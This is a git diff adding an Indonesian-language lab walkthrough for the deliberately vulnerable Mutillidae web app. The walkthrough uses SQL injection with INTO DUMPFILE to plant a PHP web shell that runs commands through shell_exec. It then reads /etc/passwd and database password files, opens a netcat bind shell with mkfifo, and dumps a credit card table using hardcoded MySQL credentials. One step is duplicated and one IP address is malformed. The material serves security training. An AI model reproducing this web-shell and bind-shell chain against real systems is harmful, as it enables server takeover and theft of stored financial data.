@@ -394,10 +394,79 @@ RLIKE '^[0-9]' union select ccid,ccnumber,ccv,expiration,null from credit_cards 
 ![](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%20Final/Mutillidae/Screenshot/m9_10.png)
 
 
+## Lesson 10 - SQL Injection Union Exploit #3 (Create PHP Execution Script)
 
-   
-   
+1. Akses mutillidae dari BackTrack dengan URL `http://192.168.56.1/mutillidae`
 
+2. Buka <b>User Info</b>
+
+3. Inspect element pada textbox Name  dan ubah <b>`size`</b> dari 20 menjadi <b>`100`</b>
+
+4. Isi textbox name dengan perintah berikut lalu klik tombol <b> View Account Details</b>
+```
+' union select null,null,null,null,'<form action="" method="post" enctype="application/x-www-form-urlencoded"><input type="text" name="CMD" size="50"><input type="submit" value="Execute Command" /></form><?php echo "<pre>";echo shell_exec($_REQUEST["CMD"]);echo "</pre>"; ?>' INTO DUMPFILE '/var/www/html/mutillidae/execute_command.php' --
+```
+![](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%20Final/Mutillidae/Screenshot/m10_01.png)
+
+5. Akan muncul hasil seperti pada gambar
+
+![](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%20Final/Mutillidae/Screenshot/m10_02.png)
+
+6. Ubah URL menjadi `http://192.168.56.1/mutillidae/execute_command.php`
+
+7. Masukkan `whoami; pwd` lalu klik tombol <b> Execute Command </b>
+
+![](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%20Final/Mutillidae/Screenshot/m10_03.png)
+
+8. Untuk melihat user yangberstatus logged on maka masukkan perintah `w` lalu klik tombol <b>Execute Command</b>
+
+![](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%20Final/Mutillidae/Screenshot/m10_04.png)
+
+9. Untuk melihat potential services to attack, masukkan perintah `cat /etc/passwd/` lalu <b>Execute Command</b>
+
+![](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%20Final/Mutillidae/Screenshot/m10_05.png)
+
+10. Untuk melakukan pengamatan pada network, masukkan perintah `netstat -nao | grep "0.0.0.0:"` lalu <b> Execute Command</b>
+
+![](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%20Final/Mutillidae/Screenshot/m10_06.png)
+
+11. Untuk mendapatkan password dari database, masukkan perintah `find * -name "*.php" | xargs grep -i "password" | grep "="` lalu <b> Execute Command</b>
+
+![](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%20Final/Mutillidae/Screenshot/m10_07.png)
+
+password = `root`
+
+12. Untuk menampilkan file PHP yang berisi database configuration, masukkan perintah `cat classes/MySQLHandler.php | grep -v "<?php"` lalu <b>Execute Command</b>
+
+![](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%20Final/Mutillidae/Screenshot/m10_08.png)
+
+![](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%20Final/Mutillidae/Screenshot/m10_09.png)
+   
+13. Untuk menghitung jumlah koneksi pada suatu port, masukkan perintah `which nc; netstat -nao | grep 4444 | wc -l` lalu <b>Execute Command</b>
+
+![](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%20Final/Mutillidae/Screenshot/m10_10.png)
+
+14. Untuk menjalankan netcat, masukkan perintah `mkfifo /tmp/pipe;sh /tmp/pipe | nc -l 4444 > /tmp/pipe` lalu <b>Execute Command</b>
+
+![](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%20Final/Mutillidae/Screenshot/m10_11.png)
+
+15. Untuk menjalankan netcat, masukkan perintah `mkfifo /tmp/pipe;sh /tmp/pipe | nc -l 4444 > /tmp/pipe` lalu <b>Execute Command</b>
+
+![](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%20Final/Mutillidae/Screenshot/m10_11.png)
+
+16. Buka terminal pada BackTrack, ketik perintah `nc 192.168.1 4444` agar terhubung dengan netcat
+
+![](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%20Final/Mutillidae/Screenshot/m10_12.png)
+
+17. Untuk melihat data dari tabel credit card, ketik perintah berikut
+```
+echo "show databases;" | mysql -uroot -psamurai
+echo "use nowasp; show tables;" | mysql -uroot -psamurai
+echo "select * from nowasp.credit_cards;" | mysql -uroot -psamurai
+```
+![](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%20Final/Mutillidae/Screenshot/m10_13.png)
+
+![](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%20Final/Mutillidae/Screenshot/m10_14.png)
 
 
 Referensi : http://www.computersecuritystudent.com/SECURITY_TOOLS/MUTILLIDAE/MUTILLIDAE_2511/lesson8/index.html
